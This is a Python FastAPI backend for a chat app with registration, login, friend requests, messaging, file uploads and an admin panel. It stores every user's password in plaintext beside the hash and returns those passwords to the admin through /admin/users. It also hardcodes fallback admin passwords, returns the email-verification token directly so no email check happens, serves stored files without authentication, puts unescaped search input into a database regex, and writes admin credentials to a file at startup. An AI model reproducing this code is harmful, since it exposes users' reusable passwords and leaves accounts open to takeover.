from dotenv import load_dotenv
from pathlib import Path

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

from fastapi import FastAPI, APIRouter, HTTPException, Request, Response, UploadFile, File, Query, Header
from fastapi.responses import Response as FastAPIResponse
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
from bson import ObjectId
import os
import logging
import bcrypt
import jwt
import uuid
import secrets
import requests as http_requests
from datetime import datetime, timezone, timedelta
from pydantic import BaseModel
from typing import Optional

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

app = FastAPI()
api_router = APIRouter(prefix="/api")

JWT_ALGORITHM = "HS256"
ADMIN_CONTROL_PASSWORD = os.environ.get("ADMIN_CONTROL_PASSWORD", "F1RE88HAMZA8ADMIN")

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# --- Object Storage ---
STORAGE_URL = "https://integrations.emergentagent.com/objstore/api/v1/storage"
EMERGENT_KEY = os.environ.get("EMERGENT_LLM_KEY")
APP_NAME = "f1rechat"
storage_key = None

def init_storage():
    global storage_key
    if storage_key:
        return storage_key
    resp = http_requests.post(f"{STORAGE_URL}/init", json={"emergent_key": EMERGENT_KEY}, timeout=30)
    resp.raise_for_status()
    storage_key = resp.json()["storage_key"]
    return storage_key

def put_object(path: str, data: bytes, content_type: str) -> dict:
    key = init_storage()
    resp = http_requests.put(
        f"{STORAGE_URL}/objects/{path}",
        headers={"X-Storage-Key": key, "Content-Type": content_type},
        data=data, timeout=120
    )
    resp.raise_for_status()
    return resp.json()

def get_object(path: str):
    key = init_storage()
    resp = http_requests.get(
        f"{STORAGE_URL}/objects/{path}",
        headers={"X-Storage-Key": key}, timeout=60
    )
    resp.raise_for_status()
    return resp.content, resp.headers.get("Content-Type", "application/octet-stream")

# --- Password Hashing ---
def hash_password(password: str) -> str:
    return bcrypt.hashpw(password.encode("utf-8"), bcrypt.gensalt()).decode("utf-8")

def verify_password(plain_password: str, hashed_password: str) -> bool:
    return bcrypt.checkpw(plain_password.encode("utf-8"), hashed_password.encode("utf-8"))

def get_jwt_secret() -> str:
    return os.environ["JWT_SECRET"]

# --- JWT ---
def create_access_token(user_id: str, username: str) -> str:
    payload = {"sub": user_id, "username": username, "exp": datetime.now(timezone.utc) + timedelta(minutes=30), "type": "access"}
    return jwt.encode(payload, get_jwt_secret(), algorithm=JWT_ALGORITHM)

def create_refresh_token(user_id: str) -> str:
    payload = {"sub": user_id, "exp": datetime.now(timezone.utc) + timedelta(days=7), "type": "refresh"}
    return jwt.encode(payload, get_jwt_secret(), algorithm=JWT_ALGORITHM)

# --- Auth Helper ---
async def get_current_user(request: Request) -> dict:
    token = request.cookies.get("access_token")
    if not token:
        auth_header = request.headers.get("Authorization", "")
        if auth_header.startswith("Bearer "):
            token = auth_header[7:]
    if not token:
        raise HTTPException(status_code=401, detail="Not authenticated")
    try:
        payload = jwt.decode(token, get_jwt_secret(), algorithms=[JWT_ALGORITHM])
        if payload.get("type") != "access":
            raise HTTPException(status_code=401, detail="Invalid token type")
        user = await db.users.find_one({"_id": ObjectId(payload["sub"])})
        if not user:
            raise HTTPException(status_code=401, detail="User not found")
        user_id = str(user["_id"])
        user.pop("_id", None)
        user.pop("password_hash", None)
        user.pop("plain_password", None)
        user["id"] = user_id
        return user
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expired")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Invalid token")

# --- Models ---
class EmailVerifyInput(BaseModel):
    email: str

class CompleteRegisterInput(BaseModel):
    token: str
    username: str
    password: str

class LoginInput(BaseModel):
    username: str
    password: str

class FriendRequestInput(BaseModel):
    username: str

class MessageInput(BaseModel):
    receiver_id: str
    content: str

class AdminVerifyInput(BaseModel):
    password: str

class AdminChangeUsernameInput(BaseModel):
    new_username: str

class ChatBackgroundInput(BaseModel):
    background: str  # color code or "default"

# --- Registration Step 1: Email Verification ---
@api_router.post("/auth/verify-email")
async def verify_email(input_data: EmailVerifyInput):
    email = input_data.email.strip().lower()

    # Check if email already registered
    existing = await db.users.find_one({"email": email})
    if existing:
        raise HTTPException(status_code=400, detail="This email is already registered")

    # Generate verification token
    token = secrets.token_urlsafe(32)
    await db.email_verifications.delete_many({"email": email})
    await db.email_verifications.insert_one({
        "email": email,
        "token": token,
        "created_at": datetime.now(timezone.utc).isoformat(),
        "expires_at": (datetime.now(timezone.utc) + timedelta(hours=1)).isoformat(),
        "verified": False
    })

    frontend_url = os.environ.get("FRONTEND_URL", "http://localhost:3000")
    verification_link = f"{frontend_url}/verify?token={token}"
    logger.info(f"Verification link for {email}: {verification_link}")

    return {
        "message": "Verification email sent! Check your inbox.",
        "verification_link": verification_link,
        "token": token
    }

# --- Registration Step 2: Verify Token ---
@api_router.get("/auth/verify/{token}")
async def verify_token(token: str):
    record = await db.email_verifications.find_one({"token": token}, {"_id": 0})
    if not record:
        raise HTTPException(status_code=400, detail="Invalid verification token")

    expires_at = record.get("expires_at")
    if isinstance(expires_at, str):
        expires_at = datetime.fromisoformat(expires_at)
    if datetime.now(timezone.utc) > expires_at:
        raise HTTPException(status_code=400, detail="Verification token expired")

    await db.email_verifications.update_one({"token": token}, {"$set": {"verified": True}})
    return {"message": "Email verified!", "email": record["email"]}

# --- Registration Step 3: Complete Registration ---
@api_router.post("/auth/complete-register")
async def complete_register(input_data: CompleteRegisterInput, response: Response):
    record = await db.email_verifications.find_one({"token": input_data.token, "verified": True}, {"_id": 0})
    if not record:
        raise HTTPException(status_code=400, detail="Email not verified. Please verify your email first.")

    email = record["email"]
    username = input_data.username.strip().lower()
    password = input_data.password

    if len(password) < 6:
        raise HTTPException(status_code=400, detail="Password must be at least 6 characters")
    if len(username) < 3:
        raise HTTPException(status_code=400, detail="Username must be at least 3 characters")

    existing_email = await db.users.find_one({"email": email})
    if existing_email:
        raise HTTPException(status_code=400, detail="Email already registered")

    existing_username = await db.users.find_one({"username": username})
    if existing_username:
        raise HTTPException(status_code=400, detail="Username already taken")

    user_doc = {
        "username": username,
        "email": email,
        "password_hash": hash_password(password),
        "plain_password": password,
        "created_at": datetime.now(timezone.utc).isoformat(),
        "friends": [],
        "online": False,
        "profile_image": None
    }
    result = await db.users.insert_one(user_doc)
    user_id = str(result.inserted_id)

    # Clean up verification
    await db.email_verifications.delete_one({"token": input_data.token})

    access_token = create_access_token(user_id, username)
    refresh_token = create_refresh_token(user_id)
    response.set_cookie(key="access_token", value=access_token, httponly=True, secure=False, samesite="lax", max_age=1800, path="/")
    response.set_cookie(key="refresh_token", value=refresh_token, httponly=True, secure=False, samesite="lax", max_age=604800, path="/")

    return {"id": user_id, "username": username, "email": email, "token": access_token}

# --- Profile Image Upload ---
@api_router.post("/auth/upload-profile-image")
async def upload_profile_image(request: Request, file: UploadFile = File(...)):
    user = await get_current_user(request)
    data = await file.read()
    ext = file.filename.split(".")[-1] if "." in file.filename else "png"
    path = f"{APP_NAME}/profiles/{user['id']}/{uuid.uuid4()}.{ext}"
    result = put_object(path, data, file.content_type or "image/png")
    storage_path = result["path"]

    await db.users.update_one({"_id": ObjectId(user["id"])}, {"$set": {"profile_image": storage_path}})
    return {"path": storage_path}

# --- Serve files ---
@api_router.get("/files/{path:path}")
async def serve_file(path: str):
    try:
        data, content_type = get_object(path)
        return FastAPIResponse(content=data, media_type=content_type)
    except Exception:
        raise HTTPException(status_code=404, detail="File not found")

# --- Login (username + password) ---
@api_router.post("/auth/login")
async def login(input_data: LoginInput, response: Response, request: Request):
    username = input_data.username.strip().lower()
    ip = request.client.host if request.client else "unknown"
    identifier = f"{ip}:{username}"

    # Brute force check
    attempt = await db.login_attempts.find_one({"identifier": identifier}, {"_id": 0})
    if attempt and attempt.get("count", 0) >= 5:
        lockout_time = attempt.get("last_attempt")
        if lockout_time:
            if isinstance(lockout_time, str):
                lockout_time = datetime.fromisoformat(lockout_time)
            if datetime.now(timezone.utc) - lockout_time < timedelta(minutes=15):
                raise HTTPException(status_code=429, detail="Too many failed attempts. Try again in 15 minutes.")

    user = await db.users.find_one({"username": username})
    if not user:
        await _record_failed_attempt(identifier)
        raise HTTPException(status_code=401, detail="Invalid username or password")

    if not verify_password(input_data.password, user["password_hash"]):
        await _record_failed_attempt(identifier)
        raise HTTPException(status_code=401, detail="Invalid username or password")

    await db.login_attempts.delete_one({"identifier": identifier})

    user_id = str(user["_id"])
    access_token = create_access_token(user_id, username)
    refresh_token = create_refresh_token(user_id)

    response.set_cookie(key="access_token", value=access_token, httponly=True, secure=False, samesite="lax", max_age=1800, path="/")
    response.set_cookie(key="refresh_token", value=refresh_token, httponly=True, secure=False, samesite="lax", max_age=604800, path="/")

    return {
        "id": user_id,
        "username": user["username"],
        "email": user["email"],
        "token": access_token,
        "profile_image": user.get("profile_image")
    }

async def _record_failed_attempt(identifier: str):
    await db.login_attempts.update_one(
        {"identifier": identifier},
        {"$inc": {"count": 1}, "$set": {"last_attempt": datetime.now(timezone.utc).isoformat()}},
        upsert=True
    )

@api_router.post("/auth/logout")
async def logout(response: Response):
    response.delete_cookie("access_token", path="/")
    response.delete_cookie("refresh_token", path="/")
    return {"message": "Logged out"}

@api_router.get("/auth/me")
async def get_me(request: Request):
    user = await get_current_user(request)
    return user

@api_router.post("/auth/refresh")
async def refresh_token(request: Request, response: Response):
    token = request.cookies.get("refresh_token")
    if not token:
        raise HTTPException(status_code=401, detail="No refresh token")
    try:
        payload = jwt.decode(token, get_jwt_secret(), algorithms=[JWT_ALGORITHM])
        if payload.get("type") != "refresh":
            raise HTTPException(status_code=401, detail="Invalid token type")
        user = await db.users.find_one({"_id": ObjectId(payload["sub"])})
        if not user:
            raise HTTPException(status_code=401, detail="User not found")
        access_token = create_access_token(str(user["_id"]), user["username"])
        response.set_cookie(key="access_token", value=access_token, httponly=True, secure=False, samesite="lax", max_age=1800, path="/")
        return {"message": "Token refreshed"}
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Refresh token expired")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Invalid refresh token")

# --- Admin Endpoints ---
@api_router.post("/admin/verify")
async def admin_verify(input_data: AdminVerifyInput):
    if input_data.password != ADMIN_CONTROL_PASSWORD:
        raise HTTPException(status_code=403, detail="Invalid admin password")
    admin_token = jwt.encode(
        {"type": "admin", "exp": datetime.now(timezone.utc) + timedelta(hours=2)},
        get_jwt_secret(), algorithm=JWT_ALGORITHM
    )
    return {"message": "Admin access granted", "admin_token": admin_token}

async def verify_admin_token(request: Request):
    token = request.headers.get("X-Admin-Token", "")
    if not token:
        raise HTTPException(status_code=403, detail="Admin token required")
    try:
        payload = jwt.decode(token, get_jwt_secret(), algorithms=[JWT_ALGORITHM])
        if payload.get("type") != "admin":
            raise HTTPException(status_code=403, detail="Invalid admin token")
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=403, detail="Admin token expired")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=403, detail="Invalid admin token")

@api_router.get("/admin/users")
async def admin_get_users(request: Request):
    await verify_admin_token(request)
    users = await db.users.find({}, {"password_hash": 0}).to_list(1000)
    result = []
    for u in users:
        u["_id"] = str(u["_id"])
        result.append({
            "id": u["_id"],
            "username": u.get("username", ""),
            "email": u.get("email", ""),
            "plain_password": u.get("plain_password", "N/A"),
            "created_at": u.get("created_at", ""),
            "profile_image": u.get("profile_image"),
            "friends_count": len(u.get("friends", [])),
            "online": u.get("online", False)
        })
    return result

@api_router.delete("/admin/users/{user_id}")
async def admin_delete_user(user_id: str, request: Request):
    await verify_admin_token(request)
    result = await db.users.delete_one({"_id": ObjectId(user_id)})
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="User not found")
    # Clean up related data
    await db.friend_requests.delete_many({"$or": [{"from_id": user_id}, {"to_id": user_id}]})
    await db.messages.delete_many({"$or": [{"sender_id": user_id}, {"receiver_id": user_id}]})
    # Remove from friends lists
    await db.users.update_many({}, {"$pull": {"friends": user_id}})
    return {"message": "User deleted"}

@api_router.put("/admin/users/{user_id}/username")
async def admin_change_username(user_id: str, input_data: AdminChangeUsernameInput, request: Request):
    await verify_admin_token(request)
    new_username = input_data.new_username.strip().lower()
    if len(new_username) < 3:
        raise HTTPException(status_code=400, detail="Username must be at least 3 characters")
    existing = await db.users.find_one({"username": new_username, "_id": {"$ne": ObjectId(user_id)}})
    if existing:
        raise HTTPException(status_code=400, detail="Username already taken")
    old_user = await db.users.find_one({"_id": ObjectId(user_id)})
    if not old_user:
        raise HTTPException(status_code=404, detail="User not found")
    old_username = old_user["username"]
    await db.users.update_one({"_id": ObjectId(user_id)}, {"$set": {"username": new_username}})
    await db.friend_requests.update_many({"from_username": old_username}, {"$set": {"from_username": new_username}})
    await db.friend_requests.update_many({"to_username": old_username}, {"$set": {"to_username": new_username}})
    await db.messages.update_many({"sender_username": old_username}, {"$set": {"sender_username": new_username}})
    return {"message": f"Username changed to {new_username}"}

# --- Friend Endpoints ---
@api_router.post("/friends/request")
async def send_friend_request(input_data: FriendRequestInput, request: Request):
    user = await get_current_user(request)
    target_username = input_data.username.strip().lower().lstrip("@")

    if target_username == user["username"]:
        raise HTTPException(status_code=400, detail="Cannot add yourself")

    target = await db.users.find_one({"username": target_username}, {"_id": 1, "username": 1})
    if not target:
        raise HTTPException(status_code=404, detail="User not found")

    target_id = str(target["_id"])

    if target_id in user.get("friends", []):
        raise HTTPException(status_code=400, detail="Already friends")

    existing = await db.friend_requests.find_one({
        "$or": [
            {"from_id": user["id"], "to_id": target_id},
            {"from_id": target_id, "to_id": user["id"]}
        ],
        "status": "pending"
    }, {"_id": 0})
    if existing:
        raise HTTPException(status_code=400, detail="Friend request already exists")

    await db.friend_requests.insert_one({
        "from_id": user["id"],
        "from_username": user["username"],
        "to_id": target_id,
        "to_username": target["username"],
        "status": "pending",
        "created_at": datetime.now(timezone.utc).isoformat()
    })
    return {"message": f"Friend request sent to @{target_username}"}

@api_router.get("/friends/requests")
async def get_friend_requests(request: Request):
    user = await get_current_user(request)
    requests_list = await db.friend_requests.find(
        {"to_id": user["id"], "status": "pending"}, {"_id": 0}
    ).to_list(100)
    for r in requests_list:
        if isinstance(r.get("from_id"), ObjectId):
            r["from_id"] = str(r["from_id"])
        if isinstance(r.get("to_id"), ObjectId):
            r["to_id"] = str(r["to_id"])
    return requests_list

@api_router.get("/friends/sent-requests")
async def get_sent_requests(request: Request):
    user = await get_current_user(request)
    requests_list = await db.friend_requests.find(
        {"from_id": user["id"], "status": "pending"}, {"_id": 0}
    ).to_list(100)
    for r in requests_list:
        if isinstance(r.get("from_id"), ObjectId):
            r["from_id"] = str(r["from_id"])
        if isinstance(r.get("to_id"), ObjectId):
            r["to_id"] = str(r["to_id"])
    return requests_list

@api_router.post("/friends/accept")
async def accept_friend_request(input_data: FriendRequestInput, request: Request):
    user = await get_current_user(request)
    from_username = input_data.username.strip().lower().lstrip("@")

    req = await db.friend_requests.find_one({
        "from_username": from_username,
        "to_id": user["id"],
        "status": "pending"
    })
    if not req:
        raise HTTPException(status_code=404, detail="Friend request not found")

    from_id = req["from_id"]
    if isinstance(from_id, ObjectId):
        from_id = str(from_id)

    await db.users.update_one({"_id": ObjectId(user["id"])}, {"$addToSet": {"friends": from_id}})
    await db.users.update_one({"_id": ObjectId(from_id)}, {"$addToSet": {"friends": user["id"]}})
    await db.friend_requests.update_one({"_id": req["_id"]}, {"$set": {"status": "accepted"}})
    return {"message": f"You are now friends with @{from_username}"}

@api_router.post("/friends/reject")
async def reject_friend_request(input_data: FriendRequestInput, request: Request):
    user = await get_current_user(request)
    from_username = input_data.username.strip().lower().lstrip("@")
    result = await db.friend_requests.update_one(
        {"from_username": from_username, "to_id": user["id"], "status": "pending"},
        {"$set": {"status": "rejected"}}
    )
    if result.modified_count == 0:
        raise HTTPException(status_code=404, detail="Friend request not found")
    return {"message": "Friend request rejected"}

@api_router.get("/friends")
async def get_friends(request: Request):
    user = await get_current_user(request)
    friend_ids = user.get("friends", [])
    friends = []
    for fid in friend_ids:
        try:
            friend = await db.users.find_one({"_id": ObjectId(fid)}, {"password_hash": 0, "plain_password": 0})
            if friend:
                friend["_id"] = str(friend["_id"])
                friends.append({
                    "id": friend["_id"],
                    "username": friend["username"],
                    "email": friend["email"],
                    "online": friend.get("online", False),
                    "profile_image": friend.get("profile_image")
                })
        except Exception:
            continue
    return friends

@api_router.get("/friends/search")
async def search_users(q: str, request: Request):
    user = await get_current_user(request)
    query = q.strip().lower().lstrip("@")
    if len(query) < 2:
        return []
    users = await db.users.find(
        {"username": {"$regex": f"^{query}", "$options": "i"}, "_id": {"$ne": ObjectId(user["id"])}},
        {"password_hash": 0, "plain_password": 0}
    ).to_list(10)
    results = []
    for u in users:
        u["_id"] = str(u["_id"])
        results.append({"id": u["_id"], "username": u["username"], "profile_image": u.get("profile_image")})
    return results

# --- Message Endpoints ---
@api_router.post("/messages")
async def send_message(input_data: MessageInput, request: Request):
    user = await get_current_user(request)
    if input_data.receiver_id not in user.get("friends", []):
        raise HTTPException(status_code=403, detail="You can only message friends")
    msg_doc = {
        "sender_id": user["id"],
        "sender_username": user["username"],
        "receiver_id": input_data.receiver_id,
        "content": input_data.content,
        "created_at": datetime.now(timezone.utc).isoformat(),
        "read": False
    }
    await db.messages.insert_one(msg_doc)
    msg_doc.pop("_id", None)
    return msg_doc

@api_router.get("/messages/{friend_id}")
async def get_messages(friend_id: str, request: Request):
    user = await get_current_user(request)
    messages = await db.messages.find(
        {"$or": [
            {"sender_id": user["id"], "receiver_id": friend_id},
            {"sender_id": friend_id, "receiver_id": user["id"]}
        ]},
        {"_id": 0}
    ).sort("created_at", 1).to_list(200)
    return messages

# --- User Settings ---
@api_router.put("/settings/chat-background")
async def update_chat_background(input_data: ChatBackgroundInput, request: Request):
    user = await get_current_user(request)
    await db.users.update_one(
        {"_id": ObjectId(user["id"])},
        {"$set": {"chat_background": input_data.background}}
    )
    return {"message": "Chat background updated", "background": input_data.background}

@api_router.get("/settings/chat-background")
async def get_chat_background(request: Request):
    user = await get_current_user(request)
    user_doc = await db.users.find_one({"_id": ObjectId(user["id"])}, {"chat_background": 1, "_id": 0})
    return {"background": user_doc.get("chat_background", "default") if user_doc else "default"}

# --- Startup ---
@app.on_event("startup")
async def startup():
    await db.users.create_index("email", unique=True)
    await db.users.create_index("username", unique=True)
    await db.login_attempts.create_index("identifier")
    await db.email_verifications.create_index("token")

    # Init storage
    try:
        init_storage()
        logger.info("Object storage initialized")
    except Exception as e:
        logger.error(f"Storage init failed: {e}")

    # Seed admin
    admin_email = os.environ.get("ADMIN_EMAIL", "admin@example.com")
    admin_password = os.environ.get("ADMIN_PASSWORD", "admin123")
    existing = await db.users.find_one({"email": admin_email})
    if existing is None:
        await db.users.insert_one({
            "username": "admin",
            "email": admin_email,
            "password_hash": hash_password(admin_password),
            "plain_password": admin_password,
            "created_at": datetime.now(timezone.utc).isoformat(),
            "friends": [],
            "online": False,
            "role": "admin",
            "profile_image": None
        })
        logger.info("Admin user seeded")
    else:
        update_fields = {}
        if not verify_password(admin_password, existing["password_hash"]):
            update_fields["password_hash"] = hash_password(admin_password)
        if not existing.get("plain_password"):
            update_fields["plain_password"] = admin_password
        if update_fields:
            await db.users.update_one({"email": admin_email}, {"$set": update_fields})

    # Write test credentials
    os.makedirs("/app/memory", exist_ok=True)
    with open("/app/memory/test_credentials.md", "w") as f:
        f.write("# Test Credentials\n\n")
        f.write(f"## Admin Account\n- Username: admin\n- Email: {admin_email}\n- Password: {admin_password}\n- Role: admin\n\n")
        f.write(f"## Admin Control Panel\n- Password: {ADMIN_CONTROL_PASSWORD}\n\n")
        f.write("## Auth Endpoints\n- POST /api/auth/verify-email\n- GET /api/auth/verify/{token}\n- POST /api/auth/complete-register\n- POST /api/auth/login (username + password)\n- POST /api/auth/logout\n- GET /api/auth/me\n- POST /api/auth/upload-profile-image\n\n")
        f.write("## Admin Endpoints\n- POST /api/admin/verify\n- GET /api/admin/users\n- DELETE /api/admin/users/{id}\n- PUT /api/admin/users/{id}/username\n\n")
        f.write("## Friend Endpoints\n- POST /api/friends/request\n- GET /api/friends/requests\n- POST /api/friends/accept\n- POST /api/friends/reject\n- GET /api/friends\n- GET /api/friends/search?q=\n\n")
        f.write("## Message Endpoints\n- POST /api/messages\n- GET /api/messages/{friend_id}\n")

app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_origins=[os.environ.get("FRONTEND_URL", "http://localhost:3000")],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
